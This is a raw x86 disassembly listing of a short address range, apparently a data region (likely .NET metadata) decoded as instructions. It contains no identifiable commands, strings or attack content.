  404e11:	23 00                	and    (%eax),%eax
  404e13:	00 00                	add    %al,(%eax)
  404e15:	00 16                	add    %dl,(%esi)
  404e17:	00 00                	add    %al,(%eax)
  404e19:	16                   	push   %ss
  404e1a:	8b 02                	mov    (%edx),%eax
  404e1c:	0b 00                	or     (%eax),%eax
  404e1e:	fb                   	sti
  404e1f:	23 00                	and    (%eax),%eax
  404e21:	00 00                	add    %al,(%eax)
  404e23:	00 16                	add    %dl,(%esi)
  404e25:	00 a0 15 9a 02 0d    	add    %ah,0xd029a15(%eax)
  404e2b:	00 1c 24             	add    %bl,(%esp)
  404e2e:	00 00                	add    %al,(%eax)
  404e30:	00 00                	add    %al,(%eax)
  404e32:	16                   	push   %ss
  404e33:	00 1d 1e ea 02 0f    	add    %bl,0xf02ea1e
  404e39:	00 00                	add    %al,(%eax)
  404e3b:	00 00                	add    %al,(%eax)
  404e3d:	00 80 00 16 20 d7    	add    %al,-0x28dfea00(%eax)
  404e43:	20 d0                	and    %dl,%al
  404e45:	01 11                	add    %edx,(%ecx)
  404e47:	00 30                	add    %dh,(%eax)
  404e49:	25 00 00 00 00       	and    $0x0,%eax
  404e4e:	16                   	push   %ss
  404e4f:	00 b8 14 f7 02 13    	add    %bh,0x1302f714(%eax)
  404e55:	00 6c 25 00          	add    %ch,0x0(%ebp,%eiz,1)
  404e59:	00 00                	add    %al,(%eax)
  404e5b:	00 11                	add    %dl,(%ecx)
  404e5d:	18 d8                	sbb    %bl,%al
  404e5f:	0a 86 00 14 00 0d    	or     0xd001400(%esi),%al
  404e65:	21 00                	and    %eax,(%eax)
  404e67:	00 00                	add    %al,(%eax)
  404e69:	00 06                	add    %al,(%esi)
  404e6b:	18 d2                	sbb    %dl,%dl
  404e6d:	0a 13                	or     (%ebx),%dl
  404e6f:	00 14 00             	add    %dl,(%eax,%eax,1)
  404e72:	78 25                	js     0x404e99
  404e74:	00 00                	add    %al,(%eax)
  404e76:	00 00                	add    %al,(%eax)
  404e78:	16                   	push   %ss
  404e79:	00 93 18 05 03 14    	add    %dl,0x14030518(%ebx)
  404e7f:	00 c8                	add    %cl,%al
  404e81:	25 00 00 00 00       	and    $0x0,%eax
  404e86:	16                   	push   %ss
  404e87:	00 8e 13 05 03 14    	add    %cl,0x14030513(%esi)
  404e8d:	00 04 26             	add    %al,(%esi,%eiz,1)
  404e90:	00 00                	add    %al,(%eax)
  404e92:	00 00                	add    %al,(%eax)
  404e94:	16                   	push   %ss
  404e95:	00 6a 1d             	add    %ch,0x1d(%edx)
  404e98:	05 03 14 00 a4       	add    $0xa4001403,%eax
  404e9d:	26 00 00             	add    %al,%es:(%eax)
  404ea0:	00 00                	add    %al,(%eax)
  404ea2:	16                   	push   %ss
  404ea3:	00 b0 12 05 03 14    	add    %dh,0x14030512(%eax)
  404ea9:	00 fc                	add    %bh,%ah
  404eab:	26 00 00             	add    %al,%es:(%eax)
  404eae:	00 00                	add    %al,(%eax)
  404eb0:	16                   	push   %ss
  404eb1:	00 f2                	add    %dh,%dl
  404eb3:	11 05 02 14 00 50    	adc    %eax,0x50001402
  404eb9:	27                   	daa
  404eba:	00 00                	add    %al,(%eax)
  404ebc:	00 00                	add    %al,(%eax)
  404ebe:	16                   	push   %ss
  404ebf:	00 b4 11 05 02 14 00 	add    %dh,0x140205(%ecx,%edx,1)
  404ec6:	e4 27                	in     $0x27,%al
  404ec8:	00 00                	add    %al,(%eax)
  404eca:	00 00                	add    %al,(%eax)
  404ecc:	11 00                	adc    %eax,(%eax)
  404ece:	2a 15 ff 01 14 00    	sub    0x1401ff,%dl
  404ed4:	9c                   	pushf
  404ed5:	28 00                	sub    %al,(%eax)
  404ed7:	00 00                	add    %al,(%eax)
  404ed9:	00 16                	add    %dl,(%esi)
  404edb:	00 3e                	add    %bh,(%esi)
  404edd:	1d fa 01 16 00       	sbb    $0x1601fa,%eax
  404ee2:	2c 29                	sub    $0x29,%al
  404ee4:	00 00                	add    %al,(%eax)
  404ee6:	00 00                	add    %al,(%eax)
  404ee8:	16                   	push   %ss
  404ee9:	00 62 20             	add    %ah,0x20(%edx)
  404eec:	05 03 17 00 98       	add    $0x98001703,%eax
  404ef1:	29 00                	sub    %eax,(%eax)
  404ef3:	00 00                	add    %al,(%eax)
  404ef5:	00 16                	add    %dl,(%esi)
  404ef7:	00 5a 1d             	add    %bl,0x1d(%edx)
  404efa:	05 03 17 00 2c       	add    $0x2c001703,%eax
  404eff:	2a 00                	sub    (%eax),%al
  404f01:	00 00                	add    %al,(%eax)
  404f03:	00 16                	add    %dl,(%esi)
  404f05:	00 ad 16 05 02 17    	add    %ch,0x17020516(%ebp)
  404f0b:	00 ec                	add    %ch,%ah
  404f0d:	2a 00                	sub    (%eax),%al
  404f0f:	00 00                	add    %al,(%eax)
  404f11:	00 16                	add    %dl,(%esi)
  404f13:	00 e7                	add    %ah,%bh
  404f15:	1c f6                	sbb    $0xf6,%al
  404f17:	01 17                	add    %edx,(%edi)
  404f19:	00 3c 2b             	add    %bh,(%ebx,%ebp,1)
  404f1c:	00 00                	add    %al,(%eax)
  404f1e:	00 00                	add    %al,(%eax)
  404f20:	16                   	push   %ss
  404f21:	00 e8                	add    %ch,%al
  404f23:	17                   	pop    %ss
  404f24:	05 02 17 00 10       	add    $0x10001702,%eax
  404f29:	2c 00                	sub    $0x0,%al
  404f2b:	00 00                	add    %al,(%eax)
  404f2d:	00 16                	add    %dl,(%esi)
  404f2f:	00 4c 18 05          	add    %cl,0x5(%eax,%ebx,1)
  404f33:	03 17                	add    (%edi),%edx
  404f35:	00 74 2c 00          	add    %dh,0x0(%esp,%ebp,1)
  404f39:	00 00                	add    %al,(%eax)
  404f3b:	00 16                	add    %dl,(%esi)
  404f3d:	00 d8                	add    %bl,%al
  404f3f:	13 05 02 17 00 28    	adc    0x28001702,%eax
  404f45:	2d 00 00 00 00       	sub    $0x0,%eax
  404f4a:	16                   	push   %ss
  404f4b:	00 9d 12 05 02 17    	add    %bl,0x17020512(%ebp)
  404f51:	00 0d 21 00 00 00    	add    %cl,0x21
  404f57:	00 06                	add    %al,(%esi)
  404f59:	18 d2                	sbb    %dl,%dl
  404f5b:	0a 13                	or     (%ebx),%dl
  404f5d:	00 17                	add    %dl,(%edi)
  404f5f:	00 c8                	add    %cl,%al
  404f61:	2d 00 00 00 00       	sub    $0x0,%eax
  404f66:	16                   	push   %ss
  404f67:	00 29                	add    %ch,(%ecx)
  404f69:	14 86                	adc    $0x86,%al
  404f6b:	00 17                	add    %dl,(%edi)
  404f6d:	00 c8                	add    %cl,%al
  404f6f:	2e 00 00             	add    %al,%cs:(%eax)
  404f72:	00 00                	add    %al,(%eax)
  404f74:	06                   	push   %es
  404f75:	18 d2                	sbb    %dl,%dl
  404f77:	0a 1a                	or     (%edx),%bl
  404f79:	04 17                	add    $0x17,%al
  404f7b:	00 df                	add    %bl,%bh
  404f7d:	2e 00 00             	add    %al,%cs:(%eax)
  404f80:	00 00                	add    %al,(%eax)
  404f82:	03 08                	add    (%eax),%ecx
  404f84:	8c 00                	mov    %es,(%eax)
  404f86:	0b 04 18             	or     (%eax,%ebx,1),%eax
  404f89:	00 f4                	add    %dh,%ah
  404f8b:	2e 00 00             	add    %al,%cs:(%eax)
  404f8e:	00 00                	add    %al,(%eax)
  404f90:	11 18                	adc    %ebx,(%eax)
  404f92:	d8 0a                	fmuls  (%edx)
  404f94:	86 00                	xchg   %al,(%eax)
  404f96:	19 00                	sbb    %eax,(%eax)
  404f98:	0d 21 00 00 00       	or     $0x21,%eax
  404f9d:	00 06                	add    %al,(%esi)
  404f9f:	18 d2                	sbb    %dl,%dl
  404fa1:	0a 13                	or     (%ebx),%dl
  404fa3:	00 19                	add    %bl,(%ecx)
  404fa5:	00 0d 21 00 00 00    	add    %cl,0x21
  404fab:	00 06                	add    %al,(%esi)
  404fad:	18 d2                	sbb    %dl,%dl
  404faf:	0a 13                	or     (%ebx),%dl
  404fb1:	00 19                	add    %bl,(%ecx)
  404fb3:	00 00                	add    %al,(%eax)
  404fb5:	00 00                	add    %al,(%eax)
  404fb7:	00 80 00 16 20 53    	add    %al,0x53201600(%eax)
  404fbd:	21 30                	and    %esi,(%eax)
  404fbf:	04 19                	add    $0x19,%al
  404fc1:	00 d4                	add    %dl,%ah
  404fc3:	2f                   	das
  404fc4:	00 00                	add    %al,(%eax)
  404fc6:	00 00                	add    %al,(%eax)
  404fc8:	16                   	push   %ss
  404fc9:	00 c0                	add    %al,%al
  404fcb:	1b 86 00 1c 00 10    	sbb    0x10001c00(%esi),%eax
  404fd1:	30 00                	xor    %al,(%eax)
  404fd3:	00 00                	add    %al,(%eax)
  404fd5:	00 16                	add    %dl,(%esi)
  404fd7:	00 2f                	add    %ch,(%edi)
  404fd9:	10 86 00 1c 00 48    	adc    %al,0x48001c00(%esi)
  404fdf:	30 00                	xor    %al,(%eax)
  404fe1:	00 00                	add    %al,(%eax)
  404fe3:	00 11                	add    %dl,(%ecx)
  404fe5:	18 d8                	sbb    %bl,%al
  404fe7:	0a 86 00 1c 00 0d    	or     0xd001c00(%esi),%al
  404fed:	21 00                	and    %eax,(%eax)
  404fef:	00 00                	add    %al,(%eax)
  404ff1:	00 06                	add    %al,(%esi)
  404ff3:	18 d2                	sbb    %dl,%dl
  404ff5:	0a 13                	or     (%ebx),%dl
  404ff7:	00 1c 00             	add    %bl,(%eax,%eax,1)
  404ffa:	54                   	push   %esp
  404ffb:	30 00                	xor    %al,(%eax)
  404ffd:	00 00                	add    %al,(%eax)
  404fff:	00 16                	add    %dl,(%esi)
  405001:	00 14 13             	add    %dl,(%ebx,%edx,1)
  405004:	b8 04 1c 00 cc       	mov    $0xcc001c04,%eax
  405009:	33 00                	xor    (%eax),%eax
  40500b:	00 00                	add    %al,(%eax)
  40500d:	00 16                	add    %dl,(%esi)
  40500f:	00 e7                	add    %ah,%bh
  405011:	1f                   	pop    %ds
  405012:	f1                   	int1
  405013:	04 1d                	add    $0x1d,%al
  405015:	00 84 35 00 00 00 00 	add    %al,0x0(%ebp,%esi,1)
  40501c:	11 18                	adc    %ebx,(%eax)
  40501e:	d8 0a                	fmuls  (%edx)
  405020:	86 00                	xchg   %al,(%eax)
  405022:	1f                   	pop    %ds
  405023:	00 0d 21 00 00 00    	add    %cl,0x21
  405029:	00 06                	add    %al,(%esi)
  40502b:	18 d2                	sbb    %dl,%dl
  40502d:	0a 13                	or     (%ebx),%dl
  40502f:	00 1f                	add    %bl,(%edi)
  405031:	00 00                	add    %al,(%eax)
  405033:	36 00 00             	add    %al,%ss:(%eax)
  405036:	00 00                	add    %al,(%eax)
  405038:	16                   	push   %ss
  405039:	00 d6                	add    %dl,%dh
  40503b:	12 86 00 1f 00 fc    	adc    -0x3ffe100(%esi),%al
  405041:	37                   	aaa
  405042:	00 00                	add    %al,(%eax)
  405044:	00 00                	add    %al,(%eax)
  405046:	16                   	push   %ss
  405047:	00 e9                	add    %ch,%cl
  405049:	12 05 03 1f 00 9c    	adc    0x9c001f03,%al
  40504f:	3b 00                	cmp    (%eax),%eax
  405051:	00 00                	add    %al,(%eax)
  405053:	00 16                	add    %dl,(%esi)
  405055:	00 a9 1c b8 04 1f    	add    %ch,0x1f04b81c(%ecx)
  40505b:	00 54 3c 00          	add    %dl,0x0(%esp,%edi,1)
  40505f:	00 00                	add    %al,(%eax)
  405061:	00 16                	add    %dl,(%esi)
  405063:	00 40 15             	add    %al,0x15(%eax)
  405066:	f7 02 20 00 6c 3c    	testl  $0x3c6c0020,(%edx)
  40506c:	00 00                	add    %al,(%eax)
  40506e:	00 00                	add    %al,(%eax)
  405070:	16                   	push   %ss
  405071:	00 b2 1a 86 00 21    	add    %dh,0x2100861a(%edx)
  405077:	00 0d 21 00 00 00    	add    %cl,0x21
  40507d:	00 06                	add    %al,(%esi)
  40507f:	18 d2                	sbb    %dl,%dl
  405081:	0a 13                	or     (%ebx),%dl
  405083:	00 21                	add    %ah,(%ecx)
  405085:	00 0c 3d 00 00 00 00 	add    %cl,0x0(,%edi,1)
  40508c:	11 18                	adc    %ebx,(%eax)
  40508e:	d8 0a                	fmuls  (%edx)
  405090:	86 00                	xchg   %al,(%eax)
  405092:	21 00                	and    %eax,(%eax)
  405094:	18 3d 00 00 00 00    	sbb    %bh,0x0
  40509a:	03 08                	add    (%eax),%ecx
  40509c:	21 00                	and    %eax,(%eax)
  40509e:	0b 04 21             	or     (%ecx,%eiz,1),%eax
  4050a1:	00 25 3d 00 00 00    	add    %ah,0x3d
  4050a7:	00 03                	add    %al,(%ebx)
  4050a9:	08 5b 00             	or     %bl,0x0(%ebx)
  4050ac:	0b 04 22             	or     (%edx,%eiz,1),%eax
  4050af:	00 0d 21 00 00 00    	add    %cl,0x21
  4050b5:	00 06                	add    %al,(%esi)
  4050b7:	18 d2                	sbb    %dl,%dl
  4050b9:	0a 13                	or     (%ebx),%dl
  4050bb:	00 23                	add    %ah,(%ebx)
  4050bd:	00 2c 3d 00 00 00 00 	add    %ch,0x0(,%edi,1)
  4050c4:	16                   	push   %ss
  4050c5:	00 fd                	add    %bh,%ch
  4050c7:	1e                   	push   %ds
  4050c8:	38 02                	cmp    %al,(%edx)
  4050ca:	23 00                	and    (%eax),%eax
  4050cc:	c4 3d 00 00 00 00    	les    0x0,%edi
  4050d2:	16                   	push   %ss
  4050d3:	00 16                	add    %dl,(%esi)
  4050d5:	1d 38 02 24 00       	sbb    $0x240238,%eax
  4050da:	0d 21 00 00 00       	or     $0x21,%eax
  4050df:	00 06                	add    %al,(%esi)
  4050e1:	18 d2                	sbb    %dl,%dl
  4050e3:	0a 13                	or     (%ebx),%dl
  4050e5:	00 25 00 5c 3e 00    	add    %ah,0x3e5c00
  4050eb:	00 00                	add    %al,(%eax)
  4050ed:	00 16                	add    %dl,(%esi)
  4050ef:	00 66 1f             	add    %ah,0x1f(%esi)
  4050f2:	86 00                	xchg   %al,(%eax)
  4050f4:	25 00 0d 21 00       	and    $0x210d00,%eax
  4050f9:	00 00                	add    %al,(%eax)
  4050fb:	00 06                	add    %al,(%esi)
  4050fd:	18 d2                	sbb    %dl,%dl
  4050ff:	0a 13                	or     (%ebx),%dl
  405101:	00 25 00 34 3f 00    	add    %ah,0x3f3400
  405107:	00 48 00             	add    %cl,0x0(%eax)
  40510a:	16                   	push   %ss
  40510b:	00 b5 10 86 00 25    	add    %dh,0x25008610(%ebp)
  405111:	00 10                	add    %dl,(%eax)
  405113:	40                   	inc    %eax
  405114:	00 00                	add    %al,(%eax)
  405116:	00 00                	add    %al,(%eax)
  405118:	11 00                	adc    %eax,(%eax)
  40511a:	d3 1d 86 00 25 00    	rcrl   %cl,0x250086
  405120:	9c                   	pushf
  405121:	40                   	inc    %eax
  405122:	00 00                	add    %al,(%eax)
  405124:	00 00                	add    %al,(%eax)
  405126:	11 00                	adc    %eax,(%eax)
  405128:	55                   	push   %ebp
  405129:	14 f7                	adc    $0xf7,%al
  40512b:	02 25 00 84 41 00    	add    0x418400,%ah
  405131:	00 00                	add    %al,(%eax)
  405133:	00 11                	add    %dl,(%ecx)
  405135:	00 ff                	add    %bh,%bh
  405137:	14 59                	adc    $0x59,%al
  405139:	06                   	push   %es
  40513a:	26 00 00             	add    %al,%es:(%eax)
  40513d:	42                   	inc    %edx
  40513e:	00 00                	add    %al,(%eax)
  405140:	00 00                	add    %al,(%eax)
  405142:	11 18                	adc    %ebx,(%eax)
  405144:	d8 0a                	fmuls  (%edx)
  405146:	86 00                	xchg   %al,(%eax)
  405148:	27                   	daa
  405149:	00 0d 21 00 00 00    	add    %cl,0x21
  40514f:	00 06                	add    %al,(%esi)
  405151:	18 d2                	sbb    %dl,%dl
  405153:	0a 13                	or     (%ebx),%dl
  405155:	00 27                	add    %ah,(%edi)
  405157:	00 0c 42             	add    %cl,(%edx,%eax,2)
  40515a:	00 00                	add    %al,(%eax)
  40515c:	48                   	dec    %eax
  40515d:	00 16                	add    %dl,(%esi)
  40515f:	00 ad 17 86 00 27    	add    %ch,0x27008617(%ebp)
  405165:	00 00                	add    %al,(%eax)
  405167:	00 00                	add    %al,(%eax)
  405169:	00 80 00 16 20 6f    	add    %al,0x6f201600(%eax)
  40516f:	21 86 00 27 00 30    	and    %eax,0x30002700(%esi)
  405175:	43                   	inc    %ebx
  405176:	00 00                	add    %al,(%eax)
  405178:	00 00                	add    %al,(%eax)
  40517a:	11 00                	adc    %eax,(%eax)
  40517c:	59                   	pop    %ecx
  40517d:	17                   	pop    %ss
  40517e:	86 00                	xchg   %al,(%eax)
  405180:	27                   	daa
  405181:	00 40 45             	add    %al,0x45(%eax)
  405184:	00 00                	add    %al,(%eax)
  405186:	00 00                	add    %al,(%eax)
  405188:	11 00                	adc    %eax,(%eax)
  40518a:	2e 21 86 00 27 00 f8 	and    %eax,%cs:-0x7ffd900(%esi)
  405191:	45                   	inc    %ebp
  405192:	00 00                	add    %al,(%eax)
  405194:	00 00                	add    %al,(%eax)
  405196:	11 00                	adc    %eax,(%eax)
  405198:	d4 1f                	aam    $0x1f
  40519a:	86 00                	xchg   %al,(%eax)
  40519c:	27                   	daa
  40519d:	00 0d 21 00 00 00    	add    %cl,0x21
  4051a3:	00 06                	add    %al,(%esi)
  4051a5:	18 d2                	sbb    %dl,%dl
  4051a7:	0a 13                	or     (%ebx),%dl
  4051a9:	00 27                	add    %ah,(%edi)
  4051ab:	00 00                	add    %al,(%eax)
  4051ad:	00 00                	add    %al,(%eax)
  4051af:	00 80 00 16 20 6b    	add    %al,0x6b201600(%eax)
  4051b5:	14 89                	adc    $0x89,%al
  4051b7:	06                   	push   %es
  4051b8:	27                   	daa
  4051b9:	00 b0 46 00 00 00    	add    %dh,0x46(%eax)
  4051bf:	00 16                	add    %dl,(%esi)
  4051c1:	00 3f                	add    %bh,(%edi)
  4051c3:	19 90 06 28 00 00    	sbb    %edx,0x2806(%eax)
  4051c9:	00 01                	add    %al,(%ecx)
  4051cb:	00 93 09 00 00 01    	add    %dl,0x1000009(%ebx)
  4051d1:	00 20                	add    %ah,(%eax)
  4051d3:	02 00                	add    (%eax),%al
  4051d5:	00 01                	add    %al,(%ecx)
  4051d7:	00 20                	add    %ah,(%eax)
  4051d9:	02 00                	add    (%eax),%al
  4051db:	00 01                	add    %al,(%ecx)
  4051dd:	00 3f                	add    %bh,(%edi)
  4051df:	14 00                	adc    $0x0,%al
  4051e1:	00 01                	add    %al,(%ecx)
  4051e3:	00 b6 13 00 00 01    	add    %dh,0x1000013(%esi)
  4051e9:	00 79 1f             	add    %bh,0x1f(%ecx)
  4051ec:	00 00                	add    %al,(%eax)
  4051ee:	01 00                	add    %eax,(%eax)
  4051f0:	74 18                	je     0x40520a
  4051f2:	00 00                	add    %al,(%eax)
  4051f4:	01 00                	add    %eax,(%eax)
  4051f6:	0b 1c 00             	or     (%eax,%eax,1),%ebx
  4051f9:	00 01                	add    %al,(%ecx)
  4051fb:	00 43 17             	add    %al,0x17(%ebx)
  4051fe:	00 00                	add    %al,(%eax)
  405200:	02 00                	add    (%eax),%al
  405202:	bb 1f 00 00 01       	mov    $0x100001f,%ebx
  405207:	00 54 10 00          	add    %dl,0x0(%eax,%edx,1)
  40520b:	00 02                	add    %al,(%edx)
  40520d:	00 16                	add    %dl,(%esi)
  40520f:	19 00                	sbb    %eax,(%eax)
  405211:	00 01                	add    %al,(%ecx)
  405213:	00 3f                	add    %bh,(%edi)
  405215:	1e                   	push   %ds
  405216:	00 00                	add    %al,(%eax)
  405218:	02 00                	add    (%eax),%al
  40521a:	24 1c                	and    $0x1c,%al
  40521c:	00 00                	add    %al,(%eax)
  40521e:	01 00                	add    %eax,(%eax)
  405220:	44                   	inc    %esp
  405221:	11 00                	adc    %eax,(%eax)
  405223:	00 02                	add    %al,(%edx)
  405225:	00 79 11             	add    %bh,0x11(%ecx)
  405228:	00 20                	add    %ah,(%eax)
  40522a:	00 00                	add    %al,(%eax)
  40522c:	00 00                	add    %al,(%eax)
  40522e:	00 20                	add    %ah,(%eax)
  405230:	01 00                	add    %eax,(%eax)
  405232:	f6 1a                	negb   (%edx)
  405234:	00 00                	add    %al,(%eax)
  405236:	01 00                	add    %eax,(%eax)
  405238:	3d 20 00 00 01       	cmp    $0x1000020,%eax
  40523d:	00 d8                	add    %bl,%al
  40523f:	17                   	pop    %ss
  405240:	00 00                	add    %al,(%eax)
  405242:	02 00                	add    (%eax),%al
  405244:	f5                   	cmc
  405245:	1d 00 00 01 00       	sbb    $0x10000,%eax
  40524a:	cc                   	int3
  40524b:	16                   	push   %ss
  40524c:	00 00                	add    %al,(%eax)
  40524e:	01 00                	add    %eax,(%eax)
  405250:	14 00                	adc    $0x0,%al
  405252:	00 00                	add    %al,(%eax)
  405254:	01 00                	add    %eax,(%eax)
  405256:	11 00                	adc    %eax,(%eax)
  405258:	00 20                	add    %ah,(%eax)
  40525a:	01 00                	add    %eax,(%eax)
  40525c:	2b 1b                	sub    (%ebx),%ebx
  40525e:	00 20                	add    %ah,(%eax)
  405260:	02 00                	add    (%eax),%al
  405262:	bf 0f 00 20 03       	mov    $0x320000f,%edi
  405267:	00 78 15             	add    %bh,0x15(%eax)
  40526a:	00 00                	add    %al,(%eax)
  40526c:	01 00                	add    %eax,(%eax)
  40526e:	03 19                	add    (%ecx),%ebx
  405270:	00 00                	add    %al,(%eax)
  405272:	01 00                	add    %eax,(%eax)
  405274:	e4 10                	in     $0x10,%al
  405276:	10 10                	adc    %dl,(%eax)
  405278:	02 00                	add    (%eax),%al
  40527a:	de 18                	ficomps (%eax)
  40527c:	00 00                	add    %al,(%eax)
  40527e:	01 00                	add    %eax,(%eax)
  405280:	07                   	pop    %es
  405281:	14 00                	adc    $0x0,%al
  405283:	00 01                	add    %al,(%ecx)
  405285:	00 ea                	add    %ch,%dl
  405287:	15 00 00 01 00       	adc    $0x10000,%eax
  40528c:	11 00                	adc    %eax,(%eax)
  40528e:	00 00                	add    %al,(%eax)
  405290:	01 00                	add    %eax,(%eax)
  405292:	11 00                	adc    %eax,(%eax)
  405294:	00 00                	add    %al,(%eax)
  405296:	01 00                	add    %eax,(%eax)
  405298:	0e                   	push   %cs
  405299:	17                   	pop    %ss
  40529a:	00 00                	add    %al,(%eax)
  40529c:	01 00                	add    %eax,(%eax)
  40529e:	62 1e                	bound  %ebx,(%esi)
  4052a0:	00 00                	add    %al,(%eax)
  4052a2:	01 00                	add    %eax,(%eax)
  4052a4:	89 19                	mov    %ebx,(%ecx)
  4052a6:	00 00                	add    %al,(%eax)
  4052a8:	01 00                	add    %eax,(%eax)
  4052aa:	28 1f                	sub    %bl,(%edi)
  4052ac:	00 00                	add    %al,(%eax)
  4052ae:	01 00                	add    %eax,(%eax)
  4052b0:	e8 16 09 00 d2       	call   0xd2405bcb
  4052b5:	0a 13                	or     (%ebx),%dl
  4052b7:	00 11                	add    %dl,(%ecx)
  4052b9:	00 d2                	add    %dl,%dl
  4052bb:	0a 17                	or     (%edi),%dl
  4052bd:	00 21                	add    %ah,(%ecx)
  4052bf:	00 d2                	add    %dl,%dl
  4052c1:	0a 26                	or     (%esi),%ah
  4052c3:	00 29                	add    %ch,(%ecx)
  4052c5:	00 d2                	add    %dl,%dl
  4052c7:	0a 13                	or     (%ebx),%dl
  4052c9:	00 31                	add    %dh,(%ecx)
  4052cb:	00 d2                	add    %dl,%dl
  4052cd:	0a 13                	or     (%ebx),%dl
  4052cf:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4052d2:	d2 0a                	rorb   %cl,(%edx)
  4052d4:	13 00                	adc    (%eax),%eax
  4052d6:	14 00                	adc    $0x0,%al
  4052d8:	d2 0a                	rorb   %cl,(%edx)
  4052da:	13 00                	adc    (%eax),%eax
  4052dc:	1c 00                	sbb    $0x0,%al
  4052de:	d2 0a                	rorb   %cl,(%edx)
  4052e0:	13 00                	adc    (%eax),%eax
  4052e2:	24 00                	and    $0x0,%al
  4052e4:	d2 0a                	rorb   %cl,(%edx)
  4052e6:	13 00                	adc    (%eax),%eax
  4052e8:	0c 00                	or     $0x0,%al
  4052ea:	10 02                	adc    %al,(%edx)
  4052ec:	8a 00                	mov    (%eax),%al
  4052ee:	14 00                	adc    $0x0,%al
  4052f0:	10 02                	adc    %al,(%edx)
  4052f2:	8a 00                	mov    (%eax),%al
  4052f4:	1c 00                	sbb    $0x0,%al
  4052f6:	10 02                	adc    %al,(%edx)
  4052f8:	8a 00                	mov    (%eax),%al
  4052fa:	24 00                	and    $0x0,%al
  4052fc:	10 02                	adc    %al,(%edx)
  4052fe:	8a 00                	mov    (%eax),%al
  405300:	49                   	dec    %ecx
  405301:	00 d2                	add    %dl,%dl
  405303:	0a a8 00 51 00 d2    	or     -0x2dffaf00(%eax),%ch
  405309:	0a 13                	or     (%ebx),%dl
  40530b:	00 59 00             	add    %bl,0x0(%ecx)
  40530e:	d2 0a                	rorb   %cl,(%edx)
  405310:	13 00                	adc    (%eax),%eax
  405312:	61                   	popa
  405313:	00 94 05 02 01 39 00 	add    %dl,0x390102(%ebp,%eax,1)
  40531a:	8c 0c 07             	mov    %cs,(%edi,%eax,1)
  40531d:	01 39                	add    %edi,(%ecx)
  40531f:	00 29                	add    %ch,(%ecx)
  405321:	02 0c 01             	add    (%ecx,%eax,1),%cl
  405324:	69 00 e6 02 10 01    	imul   $0x11002e6,(%eax),%eax
  40532a:	39 00                	cmp    %eax,(%eax)
  40532c:	7e 06                	jle    0x405334
  40532e:	1c 01                	sbb    $0x1,%al
  405330:	79 00                	jns    0x405332
  405332:	01 02                	add    %eax,(%edx)
  405334:	28 01                	sub    %al,(%ecx)
  405336:	39 00                	cmp    %eax,(%eax)
  405338:	d2 0a                	rorb   %cl,(%edx)
  40533a:	13 00                	adc    (%eax),%eax
  40533c:	81 00 d2 0a 43 01    	addl   $0x1430ad2,(%eax)
  405342:	89 00                	mov    %eax,(%eax)
  405344:	d2 0a                	rorb   %cl,(%edx)
  405346:	13 00                	adc    (%eax),%eax
  405348:	91                   	xchg   %eax,%ecx
  405349:	00 d2                	add    %dl,%dl
  40534b:	0a 13                	or     (%ebx),%dl
  40534d:	00 34 00             	add    %dh,(%eax,%eax,1)
  405350:	74 05                	je     0x405357
  405352:	ad                   	lods   %ds:(%esi),%eax
  405353:	01 99 00 d2 0a c5    	add    %ebx,-0x3af52e00(%ecx)
  405359:	01 a9 00 de 03 db    	add    %ebp,-0x24fc2200(%ecx)
  40535f:	01 b9 00 50 06 df    	add    %edi,-0x20f9b000(%ecx)
  405365:	01 b1 00 fe 0e e5    	add    %esi,-0x1af10200(%ecx)
  40536b:	01 b1 00 a3 05 eb    	add    %esi,-0x14fa5d00(%ecx)
  405371:	01 c1                	add    %eax,%ecx
  405373:	00 75 0a             	add    %dh,0xa(%ebp)
  405376:	1c 01                	sbb    $0x1,%al
  405378:	c1 00 a8             	roll   $0xa8,(%eax)
  40537b:	0c f1                	or     $0xf1,%al
  40537d:	01 c9                	add    %ecx,%ecx
  40537f:	00 46 06             	add    %al,0x6(%esi)
  405382:	f6 01 c9             	testb  $0xc9,(%ecx)
  405385:	00 b4 01 f6 01 d1 00 	add    %dh,0xd101f6(%ecx,%eax,1)
  40538c:	a3 02 fa 01 c1       	mov    %eax,0xc101fa02
  405391:	00 32                	add    %dh,(%edx)
  405393:	0d ff 01 d9 00       	or     $0xd901ff,%eax
  405398:	2b 0d d0 01 e1 00    	sub    0xe101d0,%ecx
  40539e:	bc 06 05 02 c1       	mov    $0xc1020506,%esp
  4053a3:	00 32                	add    %dh,(%edx)
  4053a5:	0d 09 02 e9 00       	or     $0xe90209,%eax
  4053aa:	c9                   	leave
  4053ab:	07                   	pop    %es
  4053ac:	11 02                	adc    %eax,(%edx)
  4053ae:	f9                   	stc
  4053af:	00 a2 09 86 00 f9    	add    %ah,-0x6ff79f7(%edx)
  4053b5:	00 8f 0a 1a 02 f9    	add    %cl,-0x6fde5f6(%edi)
  4053bb:	00 7d 0a             	add    %bh,0xa(%ebp)
  4053be:	86 00                	xchg   %al,(%eax)
  4053c0:	01 01                	add    %eax,(%ecx)
  4053c2:	a8 00                	test   $0x0,%al
  4053c4:	20 02                	and    %al,(%edx)
  4053c6:	01 01                	add    %eax,(%ecx)
  4053c8:	3b 0c 26             	cmp    (%esi,%eiz,1),%ecx
  4053cb:	02 01                	add    (%ecx),%al
  4053cd:	01 87 06 2c 02 a9    	add    %eax,-0x56fdd3fa(%edi)
  4053d3:	00 3c 0a             	add    %bh,(%edx,%ecx,1)
  4053d6:	db 01                	fildl  (%ecx)
  4053d8:	b1 00                	mov    $0x0,%cl
  4053da:	88 05 a8 00 09 01    	mov    %al,0x10900a8
  4053e0:	7e 06                	jle    0x4053e8
  4053e2:	43                   	inc    %ebx
  4053e3:	02 b1 00 ac 05 48    	add    0x4805ac00(%ecx),%dh
  4053e9:	02 44 00 d2          	add    -0x2e(%eax,%eax,1),%al
  4053ed:	0a 13                	or     (%ebx),%dl
  4053ef:	00 19                	add    %bl,(%ecx)
  4053f1:	01 d2                	add    %edx,%edx
  4053f3:	0a 13                	or     (%ebx),%dl
  4053f5:	00 29                	add    %ch,(%ecx)
  4053f7:	01 ec                	add    %ebp,%esp
  4053f9:	0d 67 02 c1 00       	or     $0xc10267,%eax
  4053fe:	d9 06                	flds   (%esi)
  405400:	0c 01                	or     $0x1,%al
  405402:	19 01                	sbb    %eax,(%ecx)
  405404:	69 04 72 02 19 01 ee 	imul   $0xee011902,(%edx,%esi,2),%eax
  40540b:	0e                   	push   %cs
  40540c:	7a 02                	jp     0x405410
  40540e:	44                   	inc    %esp
  40540f:	00 a0 01 7f 02 39    	add    %ah,0x39027f01(%eax)
  405415:	01 1b                	add    %ebx,(%ebx)
  405417:	04 13                	add    $0x13,%al
